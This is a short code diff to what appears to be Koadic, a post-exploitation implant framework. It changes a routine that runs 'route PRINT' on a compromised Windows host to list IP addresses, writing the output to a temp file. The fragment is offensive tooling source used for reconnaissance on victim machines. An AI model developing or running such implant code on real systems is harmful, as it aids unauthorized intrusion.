@@ -295,7 +295,7 @@ Koadic.user.IPAddrs = function()
 
     try
     {
-        var routeprint4 = Koadic.shell.exec("route PRINT -4", "%TEMP%\\"+Koadic.uuid()+".txt");
+        var routeprint4 = Koadic.shell.exec("route PRINT", "%TEMP%\\"+Koadic.uuid()+".txt");
         var res = routeprint4.split("\r\n");
         for (var i=0; i < res.length; i++)
         {
